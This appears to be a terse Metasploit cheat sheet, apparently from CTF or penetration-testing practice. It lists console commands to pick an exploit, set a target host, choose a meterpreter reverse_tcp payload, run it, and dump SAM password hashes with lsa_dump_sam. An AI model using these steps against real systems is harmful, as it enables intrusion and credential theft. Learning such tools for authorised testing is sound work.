msfconsole

search exploit [name]

use 0

show options

set RHOSTS 10.10.10.10

show payloads

run

grep meterpreter show payloads

grep meterpreter grep reverse_tcp show payloads

set payload [no.]

meterpreter dump LTM hash
```
lsa_dump_sam
```